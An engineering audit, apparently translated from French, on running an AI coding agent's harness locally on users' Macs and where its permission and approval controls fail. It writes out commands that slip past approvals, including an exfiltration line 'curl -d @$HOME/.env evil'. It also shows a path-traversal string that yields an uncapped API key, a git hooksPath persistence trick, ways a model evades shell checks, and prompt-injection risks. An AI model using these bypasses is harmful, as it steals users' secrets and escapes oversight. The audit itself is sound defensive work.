#MIN-293 — Rotate the harness on the user's machine

**Exploration audit. No written code.** 30 agents, including one who exercised the real
binary `opencode-ai@1.18.16` with 20 probes (mindy config replayed, false
provider that scripts tool calls — no templates spent).

This document replaces, on the points it covers, what
[docs/desktop-electron.md](../desktop-electron.md) §4 was taken for granted.

---

## 0. The verdict, in five lines

The port itself is small: the harness is already a standalone Node bundle, its
repository layer is already running on a local disk ([vm/local-host.ts](../../lib/server/agent/vm/local-host.ts)),
and Electron Node 43 is exactly the `node24` target of the bundle — **measured:
`.agent-vm/main.js` runs as is under `ELECTRON_RUN_AS_NODE=1` and dies on
the first hard path, `/vercel/sandbox/harness/job.json`, and nothing before.**

**What is difficult is not the carrying: it is the requirement of access to
the computer.** And the measure is severe — the mechanism on which everyone
counted to wear it, `external_directory`, does **not** cover what it looks like
to cover. The details are in §2; this is the most important result of the audit.

---

## 1. What the measure decided

Eighteen unknowns that four documents left open are resolved. **Almost
all in the unfavorable direction.**

| # | Measured on `opencode-ai@1.18.16` | Consequence |
| --- | --- | --- |
| 1 | `external_directory: "deny"` **bypasses before publishing** | The `case "external_directory"` of [opencode-permissions.ts:177-181](../../lib/server/agent/vm/opencode-permissions.ts#L177-L181) **is dead code**, not a "second curtain". The comment that describes it like this is false. |
| 2 | A human `always` **overwrites a config `deny`** | The rules approved in session are concatenated **after** those in the config, and it is the **last match that wins**. A “yes” on `~/*` raises a `deny` placed on `~/.ssh/*`. |
| 3 | `deny` **does not have priority**: the **declaration order** decides | Two identical configs except for the order of the keys give DENIED and ALLOWED on the same reading. |
| 4 | **No timeout on the opencode side** | Read every 12 s for **303 s**: pending request, tool `running`, session `busy`, without resolution. The only ceiling is ours (12 p.m.). Corollary: `session.idle` never happens, so anything the supervisor does to `session.idle` is suspended too. |
| 5 | Killing opencode while waiting is **irreversible** | After restart: the session is found, `GET /permission` returns `[]`, and the tool part remains frozen at `{"status":"running"}` **forever**. Nothing brings her back to life. |
| 6 | The **cascade of refusals** is real | A three-way round `bash` → **three simultaneous pending requests**. A `reject` on the first rejects the other two. |
| 7 | `always` on `edit` has the pattern **`*`**, not a path | A single click "always" silences **all** subsequent edits. Same as `task` and `webfetch`. `bash` is by verb (`echo *`). |
| 8 | The `always` is **in memory**, leaks between sessions, dies on reboot | The harness restarts opencode every turn, **one “always” is worth one turn**. The `/api/permission/saved` persistent store exists but the 1.18.16 tools do not write anything to it. |
| 9 | `*` **crosses `/`**, and `~` is expanded | The grain of a “yes” is the **subtree**. An “always” on a file at the root of home would give `~/*`. |
| 10 | `POST /question/:id/reply` **works, blocks without timeout, and does not end the round** | "`ask_user` is terminal" is a **mindy choice** ([supervisor.ts:1033-1049](../../lib/server/agent/vm/supervisor.ts#L1033-L1049)), motivated by the cost of an open microVM — motive which **falls** on the user's machine. |
| 11 | `abort` **does not unwind** pending requests | They flee and remain answerable after the end of the round. |
| 12 | A bare `deny` **removes the tool from the catalog** | `websearch` and `todowrite` are not “denied”: they do not exist. This **corrects** measure #4 recorded at the top of [opencode-config.ts:56-60](../../lib/server/agent/vm/opencode-config.ts#L56-L60). |
| 13 | A ruleset **per session** in `deny` **cuts the set of tools** | Two proposals counted on it as a clean ACL. It's not one of them. The `action: "allow"` case **remains to be measured**. |
| 14 | The `bash` tool carries a parameter **`workdir`**, and a non-repository `workdir` publishes `external_directory` with `metadata.directories` | **The only place where the shell reliably declares a path intent.** Cited by no proposition. |
| 15 | `cd` publishes `external_directory` and **never** `bash`; `cd .` and `popd` publish **nothing** | These commands **never** pass in front of `checkCommand`. Measure #1 of [opencode-permissions.ts:24-27](../../lib/server/agent/vm/opencode-permissions.ts#L24-L27) (“request for ANY command”) is true of `echo hi`, false of `cd`. |
| 16 | A request from a **subagent** carries the sessionID of the child; the waterfall is per session | No proposal addresses the case. |
| 17 | There is **no tool `list`** | `list: "allow"` ([opencode-config.ts:331](../../lib/server/agent/vm/opencode-config.ts#L331)) is a no-op. |
| 18 | `OPENCODE_SHELL_CWD` **does not exist in binary** (0 occurrences) | [opencode-config.ts:645](../../lib/server/agent/vm/opencode-config.ts#L645) is dead code, and any reasoning about a shell persisting between rounds is baseless. |

> **FACT (MIN-362, 2026-08-15): this table is no longer the source.** The measurements
> live in perennial probes, and this is where they must be read and relaunched —
> [opencode-permissions.probe.test.ts](../../lib/server/agent/vm/opencode-permissions.probe.test.ts)
> (`MDY_OPENCODE_PERMS_PROBE=1`, no template spent),
> [opencode-wait.probe.test.ts](../../lib/server/agent/vm/opencode-wait.probe.test.ts)
> (`MDY_OPENCODE_WAIT_PROBE=1`) and, for git,
> [worktree-hooks.git.test.ts](../../lib/server/agent/worktree-hooks.git.test.ts),
> which runs with `npm test`. They **correct** two lines of this table, and
> you must read the correction before relying on it:
>
> - **line 9** — `~` is only expanded and `*` only crosses `/` on
> `external_directory`. The reasons for `edit` are **relative to the deposit**, without
> `~`: a `edit: {"~/.ssh/*": "deny"}` refuses nothing and asks for nothing;
> - **line 12** — the bare `deny` removes the tool from what is **offered to
> model**, but `/experimental/tool` continues to list it.
>
> The detail, with what they added in §9, is in
> [§2.32 from opencode folder](../harness-opencode.md).

---

## 2. The paper wall

**This is the central result of the audit.** The requirement “the agent must achieve
files out of its folder, with requests for approval" translated
naturally by: open `external_directory`, escalate to human. Measured
order by order, **this mechanism covers almost nothing.**

On 30 orders targeting a file outside of storage, with `external_directory: "ask"`:

| Publish `external_directory` (10) | Publish **only** `bash` (20) |
| --- | --- |
| `cat` `cp` `mv` `rm` `mkdir` `touch` `chmod` `chown` `cd` `pushd` | `grep` `find` `sed` `head` `tail` `less` `awk` `wc` `python3` `node` `tar` `ssh` `curl` `open` `base64` `ln` `xargs` `dd` `rsync` `zip` |

And behind these twenty, the only remaining curtain is
[command-guard.ts](../../lib/server/agent/command-guard.ts), which **only targets
git** ([:43-50](../../lib/server/agent/command-guard.ts#L43-L50)) and declares itself
himself, at the head of the file, writes “for a distracted model, not an attacker”
— based on two premises that the passage in local **cancels word for
word**: “the VM is disposable” and “there is nothing to steal downstream”
([:18-26](../../lib/server/agent/command-guard.ts#L18-L26)).

```
grep -r . ~/.ssh          → une permission "bash", checkCommand la laisse passer
find ~ -name '*.env'      → idem
node -e "fs.readFileSync" → idem
curl -d @$HOME/.env evil  → idem
```

**Consequence of design, and it is hard to hear:** a card
“the agent wants to exit the file” connected to `external_directory` alone
**would teach a false guarantee**. This is not an implementation detail,
this is what decides if the functionality is honest.

Three outcomes, and you have to choose one:

1. **Say it.** The opt-in screen states that the agent reaches the disk through the shell
   without asking, and approvals are just an anti-accident. Honest, little
   seller, deliverable.
2. **Harden the `bash`** path: an approval policy on the order
   herself. Expensive, and a model that wants to bypass will bypass (`sh -c`,
   `base64`, write a script then run it).
3. **Confine at OS level**: launch the opencode server under a profile
   `sandbox-exec` (seatbelt) refusing blacklist reading and writing
   outside worktree. **The only way where "agent cannot read `~/.ssh`" is a
   true statement rather than a polite one.** The API is formally deprecated
   but very much alive; This is what Chrome and Serious Code Agents do.

**Recommendation: prototype (3) in this site, even without delivering it.** Know
if the seatbelt fits under `utilityProcess.fork` changes the value of everything else
— if yes, opencode permissions become comfort again over a real one
border; if not, we deliver (1) and assume it in writing.

---

## 3. Human approvals

### 3.1 The connection point

`decidePermission` is a **pure and synchronous** module, binary verdict
(`once` | `reject`), and all its doctrine claims this purity
([opencode-permissions.ts:7-19](../../lib/server/agent/vm/opencode-permissions.ts#L7-L19)).
**You have to keep it.** The module gains a third verdict — `ask` — that it
**render**; it is the supervisor who decides what to do with it. “Does this yes cover
this request? » is the easiest question to miss and the easiest to
test without a server.

### 3.2 Waiting should not live in the event loop

The supervisor reads the stream by hand **precisely** so that nothing freezes it
([supervisor.ts:849-862](../../lib/server/agent/vm/supervisor.ts#L849-L862)).
A two-minute `await` placed in the `if (out.permission)` branch stops the
consumption of the flow and takes with it the live, the checkpoint (therefore
`last_activity_at`, therefore the watchdog), the Stop and the deadline.

**The form that holds:** the supervisor *records* the request, mails it, and
**goes back to reading the feed**. The tool is suspended by opencode; our loop is not
never. The response goes back down through a surface of the control plane drained at the
beat — accelerated to 1 s while a request is pending, otherwise each click costs
up to five seconds of silence and the user will click twice.

### 3.3 The “defer” is not feasible

The attractive option — cut turn, respond next turn, like `ask_user`
already does it — **died at measure n°5**: the `callId` does not survive death
of the process, and nothing revives it. We cannot replay the same call; he
would have to convert the approval into a rule and *hope* that the model redoes it
same gesture.

**On the other hand, measure no. 10 opens a door that no one had seen:**
`POST /question/:id/reply` blocks without timeout and **returns control to the model without
complete the round**. The “human responds in turn” channel **already** exists
binary, for questions. It is probably the best vehicle for a
**rare and readable** approval (“agent wants to read `~/Documents`”) — much more
than inventing a third verdict for a `external_directory` which we have just
measure that it only covers ten commands.

### 3.4 What must be decided, and that nothing decides for us

- **Fatigue.** `bash: "ask"` request for *any* order. Without policy of
  sorting, an ordinary round produces tens to hundreds of requests — this is
  the opposite of the product. On the third run it will click without reading.
- **The duration of a “yes”.** Measure n°8: the protocol does not persist anything. If we
  wants a yes to go beyond the turn, **it's up to us to store it** and replay it
  in order in the next round. And measure n°7: do **not** offer “always” on
  `edit` — the pattern is `*`, and the `edit` permission is the only source of
  “files changed” from direct ([supervisor.ts:1004](../../lib/server/agent/vm/supervisor.ts#L1004)).
- **The batch.** Measure n°6: several pending requests is the ordinary case, and
  a refusal refuses them all. The card should say “agent requests N things”,
  not offer sorting. And you have to translate `permission.replied` (now ignored)
  to make cards canceled by cascade inert, otherwise the UI displays
  buttons that will respond **404**.
- **The fundamental case of minddy.** A run starts from a ticket, often when
  no one looks. A 10 min TTL with an absent user produces a
  refusal by default — which the model will bypass by the shell (§2). Claude Code has
  a name for this mode: `dontAsk`, “the session never waits for input”. It's
  probably the right default for a non-interactive run.
- **Sub-agents** (measure no. 16): who does the card come from, in which band of the
  wire, and the `running + pending` ceiling credit is calculated **at the time of
  verdict** — shifting it by several minutes changes what the cap measures.

### 3.5 Transportation does not exist

There are **no downlink channels addressed** today. The only one that exists — the
steering — is a 5 s poll whose semantics are “cut the round and
rests”, without correlation (neither type, nor recipient, nor request id). The
reuse **would destroy the round where the tool is suspended**, would cost a check
of quota by “yes”, and — worse — re-queue the run + kick the drain, that is to say
**would restart a tour in the cloud** while the tour waits on the Mac.

Two pitfalls of the deposit, already paid for elsewhere:

- Broadcasting an event from the control plane is a **detached** promise
  (`void broadcast(…)`, [live.ts:105-110](../../lib/server/agent/live.ts#L105-L110)),
  where neighbor `/stream` uses `afterOrNow` for exactly this reason. The
  “Instantaneous” rise in demand is not guaranteed.
- Without migration of the CHECK of `agent_run_events.type`, the request disappears **in
  silence** (`appendEvent` swallow failure, [runs.ts:1358-1378](../../lib/server/agent/runs.ts#L1358-L1378)).
  The trap has already been paid twice — MIN-86, `quota_exhausted`.

And no one listens when idle: `useAgentRunLive` only subscribes if the run
works **and** the conversation has started. **Notification is the only
path that joins an absent human** — but the desktop app emits its banners
from the *renderer* in web API, which has **neither buttons nor response field**.
`electron.Notification` (which has `actions` and `hasReply`) is not instantiated null
leaves.

---

## 4. The three locks

### Lock 1 — prove which run you are on

**Retained: a self-bearing HS256 token `{rid, gen, exp}`**, 15 min sliding,
exact pattern of [sso-jwt.ts](../../lib/feedback/sso-jwt.ts) (HS256 alone,
`timingSafeEqual`, TTL ceiling imposed on verification).

**Checked, and that resolves the unknown of the framing:** `defineSandboxProxy(handler,
invalidRequestHandler?)` accepts a **second argument**, called with the request
**original, unconsumed body**, when headers `vercel-forwarded-*`
are missing. The local route is therefore **neither a twin route nor a fork**: it is a
`catch` on the existing door. The 413, parsing, derivation of `surface` and
the call to `handleControlPlaneRequest` remains written **only once**.

Why not the hashed opaque token: `POST /stream` is served **without reading the line
of the run**, deliberately (~4 calls/s, ~29,000 per two-hour lap — the
reasoning is written in plain text, [control-plane.ts:291-313](../../lib/server/agent/control-plane.ts#L291-L313)).
A hash imposes a lookup per request, that is to say exactly the load that this
short circuit exists to remove. **Revocation** is paid where the line is
already read: an integer `agent_runs.local_exec_gen` compared to the claim `gen`.

> **Correction to the framing, and it is sharp.** A local run has no
> `loop_command_id`, therefore `reapDeadVmRuns` does not take the 2 h limit but the
> branch "never launched" of **15 minutes** ([drain.ts:255-262](../../lib/server/agent/drain.ts#L255-L262)).
> **The watchdog kills any local run lasting more than a quarter of an hour**, stampe
> `completed`, publishes “the agent has stopped” and charges compute.

**The damage of a stolen token, enumerated and not minimized:** `/repo-auth` returns a token
installation code `repo-write` **on request, renewable indefinitely**
([control-plane.ts:540-573](../../lib/server/agent/control-plane.ts#L540-L573));
`/tool/*` serves `create_issue`, `set_scratchpad` (complete rewriting of the notebook
private) and `web_search`, **on behalf of `run.created_by`**; `GET /messages`
**consumes** the steering queue. Only `/rest` requires the run to be active.

→ Reduce the **power** of the token rather than claiming to protect it: do not serve
`/repo-auth` on the local path (renewal goes through the app, which has the
user session), require `status = 'running'` on **all** surfaces
local, remove `set_scratchpad` from the local path.

### Lock 2 — the pattern key

**Retained: the key goes down one notch only** — to the LLM proxy of the harness,
kept in memory, **never** in `job.json` nor in `OPENCODE_CONFIG_CONTENT`
(which enters the opencode server environment, therefore readable by `env`).
**No mint = no local run**, instead of silent degradation
from today to `OPENROUTER_API_KEY`, the platform key **without cap**,
shared with Numo, transcription and embeddings.

The server relay is the **fallback**, not v1: it does not reduce the real damage (this
what a hostile model can do with the key, it can do it through the relay)
and passes 100% of the tokens of a 12-hour round through a function capped at
300 sec.

> **Flaw in the proposed custody, measured.**
> `'/../v1/keys#/chat/completions'` passes `isCompletion`
> ([llm-proxy.ts:362](../../lib/server/agent/vm/llm-proxy.ts#L362), test
> **suffix** on a raw request-target) and `fetch` normalizes to
> `/api/v1/keys`. The model **is issued a key without cap** and lock 2 falls
> entirely. → `new URL(target + path)`, **strict** equality on `pathname`,
> `method === "POST"`, rejecting `#`, `..`, `//`. A served route, not a relay.

**BYOK locally has literally no cap**: no capable key, no
`budgetUsd`, and the compute of microVM — the last safeguard in the cloud — is worth
zero. → **BYOK remains in the cloud in v1.**

### Lock 3 — the deposit

**Retained: the `git worktree` of the framing for everything that is written; reading
opens to the rest of the machine.** But the framing is wrong about its cost and misses
his best argument.

**Measured on this repository** (838 commits, 2,333 files, `.git` = 187 MB):

| Gesture | Time | Disc |
| --- | --- | --- |
| `git worktree add` | **0.54 sec** | 54 MB |
| `pnpm install --frozen-lockfile` in the new worktree | **9.0 sec** | **~0 bytes** (hardlinks from the store) |
| `cp -Rc node_modules` (APFS clonefile) | 25.4 sec | **~0 bytes** |

→ **“The first round pays for an installation” ([desktop-electron.md:356-360](../desktop-electron.md))
is wrong on macOS.**

And the argument that the framing didn't see: in a worktree, `.git` is a
**file**, so `mkdir .GIT/hooks` fails (measured: “Not a directory”), then
than in a fresh clone on APFS — case insensitive — `.GIT/hooks/post-commit`
**is** `.git/hooks/post-commit`. **The worktree closes a hole that the clone opens.**

**Why not the working copy of the human, despite “like Claude Code”:**
`commitAndPush` does `git status --porcelain` → `git add -A` → `git commit` →
`git push` ([repo-host.ts:330-365](../../lib/server/agent/repo-host.ts#L330-L365))
and `cloneRepo` does `git checkout -b` ([:169](../../lib/server/agent/repo-host.ts#L169)).
In your copy, it takes your WIP into a pull request and changes your branch
under the fingers. **Claude Code does neither: his product is a
diff that you reread in your editor.** It's not the same product — and that's it
that we must say to ourselves before wanting to imitate it.

**What the worktree does not isolate**, and which cancels its central argument:
`git -C ~/Projets/minddy checkout autre-branche` and `git -C … stash` are
**allowed** — `gitInvocation` skips global options `-C`/`--git-dir`/
`--work-tree` ([command-guard.ts:153-174](../../lib/server/agent/command-guard.ts#L153-L174))
and only refuses six subcommands. **The worktree isolates the harness; it does not isolate
not the model.** It is a *product* border (which goes into PR), no
security.

And `git config` is not kept by anyone: `git -C <human repository> config
core.hooksPath <agent directory>` causes **execute agent code to
next `git commit` of the human**, in his terminal, with his keychain
unlocked — persistence that neither key revocation nor lock closure
the app does not reach.

---

## 5. Hosting on the Mac

**Retained: `utilityProcess.fork` from the main process**, with the embedded Node
(**measured: Electron 43.4.0 → Node 24.18.1**, exactly the bundle target).
Bundle **downloaded per round** from the origin of the active channel — ship it on
would enter the republication imprint and would cost a notarization to
each movement of `protocol.ts`.

> **DONE (MIN-293, 2026-08-15).** The launcher is
> [desktop/src/launcher.ts](../../desktop/src/launcher.ts) and its decisions live
> in `lib/desktop/` with their tests. Two things are worth remembering from
> reasoning, because they cannot be read in the code:
>
> - **the choice of `utilityProcess.fork` does not affect the version of Node.**
> A detached process would also give it. It is played on two properties that it
> does not have: it dies with the app, and **it keeps its TCC responsible process** —
> repaired to `launchd`, it loses it, and the macOS authorization window does not
> opens even more;
> - **Bundle imprint is not a transport precaution.** TLS guarantees
> already what we download. What it keeps is the file **once placed
> on the disk**: it lives under `userData`, writable by the model under the
> same UID, and a turn that rewrites it would capture the lease, the key on the next turn
> and the `authUrl`. Hence the manifest separated from the bytes, and a recheck
> **within a hair of `fork`**, not just for downloading.

**Discovery: a PULL with lease**, not the push of §4.5. Presence becomes
**emerging** — a machine that no longer demands is no longer there — where the push
requires a heartbeat, a race between machines and an invalidation, for the same
result. And the real-time subscription lives in the **page**, not in the app: it does not
no use for a shell in the background.

**The trick must die with the app.** A detached harness surviving ⌘Q would keep a
GitHub token `contents: write` and a living LLM key without any UI for them
stop. Today `before-quit` destroys the window **without asking anything**: it
you have to write the question.

**Seven things that break, and that no document mentioned:**

1. The **watchdog** kills any local run > 15 min (see lock 1).
2. `sandboxMs` **bills** the user for microVM minutes that no one has
   paid — and correct it “by asking the harness to return 0” entrusted to the
   potentially compromised machine the care of not charging itself. → **terminal
   server**, “run local” mark set at launch and never reread from the report.
3. The **live diff disappears**: the route reads the microVM by RPC and falls back to
   silence on the forge, which only knows what is pushed.
4. The **opencode server survives** the death of the harness (`spawn` neither detached nor
   followed): 143 MB in memory, port 4096 held, **and the next round fails** on
   a `listen` refused.
5. **Fixed ports** 4096 / 4097, on a developer machine.
6. The **background jobs** of the model are launched in `setsid` **explicitly to
   survive shell** ; `stopAll` never runs on a ⌘Q. The `npm run dev`
   that the model launched remains alive, port 3000 taken, **no register anywhere
   to find him**.
7. **Two runs on a machine** are not reduced to a port collision:
   `VM_JOB_PATH`, `OPENCODE_DB_PATH`, `OPENCODE_ANCHOR_FILE`, XDGs and
   `TOOL_OUTPUT_DIR` are **global** constants. The layout must be a
   object **per run**, not an environment variable set once.

> **DONE (MIN-293, 2026-08-15). The launcher exists, and all seven are on sale.**
> What they became, one by one — and two of them already were:
>
> | # | Where it is processed |
> | --- | --- |
> | 1 | **Already set in MIN-355.** `reapDeadVmRuns` gives a local run the limit of **two hours** (that of the unreachable microVM) and not that of fifteen minutes of “never launched” — a local run has neither sandbox nor `loop_command_id`, there is no one to question, and a Mac that sleeps for four minutes should not lose its turn ([drain.ts](../../lib/server/agent/drain.ts)). |
> | 2 | **Already set in MIN-360.** `billableSandboxMs` returns **0** as soon as the LINE says local ([vm-rest.ts](../../lib/server/agent/vm-rest.ts)), and `reapDeadVmRuns` doesn't charge anything on this path either. The terminal is server, never a figure that the harness would render. |
> | 3 | **The assumed product loss of the site**, said at the top of §4 of [desktop-electron.md](../desktop-electron.md) with its three neighbors. Nothing is fixed: the route reads the microVM via RPC, and the backend has no access to the user's disk. |
> | 4 | **Fixed.** The harness registers its long-lived children in `<harnessDir>/children.json` **before** they serve ([vm/child-registry.ts](../../lib/server/agent/vm/child-registry.ts)) and unregisters them when it stops them itself; the launcher rereads this file at the end of a turn, at a ⌘Q, and **at app startup** for those orphaned by a crash. The comment from `opencode-host.ts` which said “the child dies with us” is corrected: it was true of the happy path and false of the rest. |
> | 5 | **Already set in MIN-354**: `reservePort()` requests the port from the kernel, the tools bridge listens on `0`. |
> | 6 | **Trench: `run_background` is not served on a machine** (`agentToolsFor({ local })`, [tools.ts](../../lib/server/agent/tools.ts)). A `setsid` exists to survive the shell, and `stopAll` does not run on a ⌘Q. The cost is real - the model can no longer launch a dev server to see its page render - and it is the counterpart of the only tenable promise on someone's machine: *nothing that the agent has launched survives you*. Reopenable the day the child register will also cover substantive jobs. |
> | 7 | **Already set in MIN-354** (`HarnessLayout` per run), and the shell is the first client outside microVM: `localLayout` places a root by identifier under `userData` ([lib/desktop/local-turn.ts](../../lib/desktop/local-turn.ts)). |
>
> **And two things that the measure added to this list:**
>
> - **`npm` is not guaranteed.** `ensureInstalled` shell-out `npm i opencode-ai@…`,
> or **Electron ships with Node, not npm**. The initial finding had been processed
> by a refusal before the fork, but an app launched by Finder did not even see
> the npm yet installed on the machine. The bootstrap is now autonomous:
> npm is a production dependency of the bundle, launched by the Electron Node;
> the launcher preheats and logs, then the harness rechecks and repairs
> authoritatively before each start
> ([lib/desktop/opencode-install.ts](../../lib/desktop/opencode-install.ts)).
> - **The graph type of `vm/protocol.ts` does not cross the border.** It
> import-type `../runs`, which is `server-only`: the shell that would import it
> would bring half of the server into its type-check, which has neither `global.d.ts`
> nor the same settings, and then comes across around forty files. Hence the
> move from `vmBundlePath`/`vmJobPath` to `harness-layout.ts` (none
> import, already read by three worlds) and a structural job on the shell side, including the
> contract is rechecked in `lib/desktop/local-turn.test.ts` — the only place
> where the two graphs have the right to meet.

**TCC is not processed anywhere.** The bundle does not carry any `NS…FolderUsageDescription`:
as soon as the agent reads `~/Documents`, `~/Desktop`, `~/Downloads` or iCloud Drive,
macOS refuses and **the request window doesn't even open**. The refusal is silent —
exactly the microphone bug already encountered. And the entitlement
`disable-library-validation`, required to launch a `opencode` that we do not sign
not, **combined with `allow-dyld-environment-variables` already present**, transforms
the TCC heritage vehicle app.

---

## 6. What goes back — the non-repairable point

All propositions reason about what **descends**. Nobody watches this
which **goes back**.

`agent_run_journal` carries the **full output of each tool** — a reading of
260 lines weigh 22 KB, republished two to three times, written in batches of 1.5 MB,
**kept for 30 days** and **replayed in front of the model** in the next round. In
parallel `agent_run_events` is persisted for 30 days and **read by any member of the
project**.

Today this is the content of a disposable clone of a repository that the project owns
already. With access to the computer, it is the contents of personal files,
`/Users/<first name last name>/…` paths, code from other clients, and neighboring `.env` —
**which go to the minddy production base**, and for events, under the
eyes of project colleagues. And `redact.ts` only knows **one** secret, the token
forge, by **literal** substitution (`split`/`join`), ignoring any
value of less than 12 characters.

**This is the only point in the file that cannot be repaired after the fact: what is
mounted is mounted.** To be decided before the first line of code:

- tool outputs carrying a path outside the worktree are not logged
  neither published as an event, only **counted**;
- the log of a local run is truncated (or encrypted at rest);
- the opt-in screen says **literally** “what the agent reads on your machine is
  sent to minddy and kept for 30 days", and the privacy policy on
  resumes.

Corollary: the most likely exfiltration path is not `curl`, it is
**`git add -A` → commit → push → pull request**, triggered without human, from
of a secret that the reading scope will have *legitimately* authorized. On a deposit
public, it is published. `delivery-gate.ts` is a **quality** door, not
leak. → **hard secret scan on the diff before push, who refuses and says so.**

---

## 7. What should not be delivered without its counter-power

| Do not deliver | Without |
| --- | --- |
| Opening `external_directory` | a hardening of the `bash` path, or the written confession of §2 |
| A sustainable grant | a hard list applied **by us** (measure no. 2), a duration, and the exclusion of non-interactive runs |
| The key to the machine | mandatory mint, **normalized** path guard, BYOK refusal |
| The downloaded bundle | fork fingerprint verification — this is the only non-Apple-signed code the app runs, and it is **template-writable** under the same UID |
| Copying `.env` | `core.excludesFile` **and** secret scan on push |
| `webfetch: "allow"` | it now reaches the loopback (thus the LLM proxy and the tools bridge, which **does not authenticate anything**), the LAN, the NAS and the corporate VPN |

**A server invariant, not a default:** a run whose anchor is `pr`, or
triggered by a forge webhook, external mention, routine, string or
the public feedback board **never leaves on a local machine**. The context
of such a run is **potential attacker text** — the repository already recognizes it
by refusing a `repo-write` token to fork sessions (“a prompt injection
from the fork was enough to read it and exfiltrate it"). Locally, the same
injection is **a shell on the developer's machine**. The predicate must be
source of the trigger, not `job.interactive` (which is worth `!run.routine_id`, so
**true** for webhook-triggered PR replay).

**And a defect to be corrected in the same gesture:** `decidePermission` ends up
`default: return ALLOW`. Any undeclared permission type — `lsp`, `skill`,
`doom_loop`, `plan_enter`, and anything an upgrade will add — passes.
On the local path, **`default` becomes `reject`**.

---

## 8. What the audit reopens in the framework

### The toggle criterion is dead

MIN-293 and [desktop-electron.md](../desktop-electron.md) §4 pose the same criterion
acceptance: *“The product must be identical; only the machine changes. »*
**Computer access requirement overrides this.** Local run will have maps
approval, a reading scope, **no more live diff**, a type-check
which can be silent (if `node_modules` is missing, `detectTypeChecker` returns `null` and
**the delivery door is silent**), a machine that heats up and a disc that
swells. → Rewrite the ticket description and amend §4, otherwise the framing
becomes a trap for the next person who opens it.

> **DONE.** The description of MIN-293 was rewritten on 2026-08-14 (it names
> from now on the loss of the diff as “the assumed product loss of the site”), and
> §4 of [desktop-electron.md](../desktop-electron.md) carries since MIN-363 the
> criterion which replaces that one, with its four differences in the table.

### Execution mode flag already exists

The audit reiterated that “no field distinguishes a local run from a cloud run.”
This is wrong: `agent_runs.loop_in_vm` and `agent_runs.agent_engine` are **already**
execution modes **frozen at launch**, derived from a list of projects in
`app_config` — that is to say exactly the opt-in per project that §4.4 already calls for
prowled. And they carry a **written doctrine**: *“a conversation does not change
NEVER a motor during its life »*, because *« each motor rereads ITS memory
in the checkpoint »*.

**But the cloud fallback of §4.5 violates this frontally** (turn 1 local, turn 2 in
microVM, replayed opencode log, session with project identity as path
of the deposit). → Let `local` join these flags and **the fallback only exists before the
first round** — which greatly simplifies the file — or we document
why the hot switch is safe here while it was refused there.

### The construction site lands where the test suite does not go

`vitest.config.ts`: `include: ["lib/**/*.test.ts"]`. **Neither `app/api/**` nor
`desktop/src/**`** are not exercised — but lock 1 fits in *a* file
`app/api/`, and the caster lives in `desktop/src/`. However, the deposit has two
answers already written: the **structural tests** which read the source
(`engine-wiring.test.ts` explains the doctrine) and **permanent probes**
`*.probe.test.ts`. → Write the test matrix **before** the batches, and add
`lib/i18n-contract.test.ts`: The opt-in screen and approval cards are
dual catalog channels.

> **DONE (MIN-362): the matrix is executable.**
> [local-surface-coverage.test.ts](../../lib/server/agent/local-surface-coverage.test.ts)
> requires that a named surface outside of `lib/**` be reached by a test of
> `lib/`, keeps inventory of `desktop/src/` — one more file should say where
> live his decisions — and impose the boss `<module>.ts` / `<module>.test.ts`
> in `lib/desktop/`. This is where the pitcher will have to register: his decision
> descends into `lib/desktop/`, the shell only keeps the `fork`.

### The order of battle, and the border with MIN-294

MIN-293 (xl, `null` plan, zero sub-issues) **blocks** MIN-294. But without MIN-294,
no run ever reaches the machine — and `kickAgentDrain` leaves the cloud
in the same invocation as the launch, so **the cloud always wins**. *A
xl ticket of which nothing can be checked before the next one is made is delivered
not.* Proposed breakdown, each batch verifiable alone:

1. **Layout by parameterized run** — `REPO_DIR` & others output constants
   (~21 files, ~80 test cases to rewrite). **Everything else is blocked
   behind**, including approvals: today `absoluteInRepo` would raise
   on each real `metadata.filepath` and would deny **100%** of writes.
2. **Second admission path + token**, with an assumed dev trigger that
   forces a local run without MIN-294.
3. **Minted key and explicit refusal.**
4. **Worktree and git identity.**
5. **Permissions and scope.**

And correct the attribution: the presence, the claim and the fallback belong to
**MIN-294**, not 293.

---

## 9. What remains to measure before committing

Four of these seven points have been measured since (MIN-362, 2026-08-15) and are
become probes; the three that remain are the ones that still carry a risk.

- ✅ `action: "allow"` in **session ruleset**: it's a **real ACL** — it
  raises the `ask` of the config **without** cutting the set of tools, where the `deny` of
  session amputates it. The only authorization per session that does not cost a tool.
- ✅ The **V2 permissions system**: nothing happens. Neither
  `/api/session/:id/permission`, nor `/api/permission/request`, nor
  `/api/permission/saved` doesn't see anything, even after an "always".
  The only native persistence offered is **unusable in 1.18.16**.
- ✅ A long wait with a **real supplier**: it lasts. 120 seconds
  request pending on a Haiku round passed through the proxy, and the round restarts when
  we respond (`MDY_OPENCODE_WAIT_LIVE=1`).
- ✅ That a `core.hooksPath` placed on the main deposit applies **from a
  worktree**: **yes**. The `config` is shared by all worktrees, so a
  `git commit` launched there executes the user's `pre-commit`. Our end of
  tower is not affected (plumbing), but nothing else should be committed
  otherwise. → [worktree-hooks.git.test.ts](../../lib/server/agent/worktree-hooks.git.test.ts)
- `sandbox-exec` under `utilityProcess.fork`: **the measure that changes the value of
  everything else** (§2). Always open.
- The presence of `OPENROUTER_PROVISIONING_KEY` **in production** — if it is missing,
  the local path is stillborn.
- The calling sites of `skill`, `lsp`, `doom_loop`, `plan_enter`/`plan_exit`.

---

## 10. Documentation debts created by this audit

Five contract comments in the repository become **false** and need to be fixed
in the batch that expires — this is the class of error that this repository fights everywhere
elsewhere:

| File | What becomes false |
| --- | --- |
| [opencode-permissions.ts:24-27](../../lib/server/agent/vm/opencode-permissions.ts#L24-L27) | “`bash: "ask"` request for ANY order” — fake of `cd`, `cd .`, `popd` |
| [opencode-permissions.ts:175-181](../../lib/server/agent/vm/opencode-permissions.ts#L175-L181) | “second curtain” — branch **never reached** |
| [opencode-config.ts:56-60](../../lib/server/agent/vm/opencode-config.ts#L56-L60) | “`tools:{x:false}` does not remove the tool” — in 1.18.16 it is `deny` which removes it |
| [opencode-config.ts:645](../../lib/server/agent/vm/opencode-config.ts#L645) | `OPENCODE_SHELL_CWD` does not exist in binary |
| [network-policy.ts:10-11](../../lib/server/agent/network-policy.ts#L10-L11), [vm/main.ts:25-28](../../lib/server/agent/vm/main.ts#L25-L28) | “the executing machine holds no secrets” — ceases to be true |

And a lack of product: **when a local run really fails** — before the
harness has spoken (bundle which does not launch, opencode which does not install,
worktree impossible, TCC refused, 403) — there is **no log**: the `stdio`
of `utilityProcess` is not wired anywhere, and the opencode logs go to a
machine folder. This is the first support ticket for the feature, and it
will be insoluble. → capture the stdout/stderr from the launcher, and a “copy it” gesture
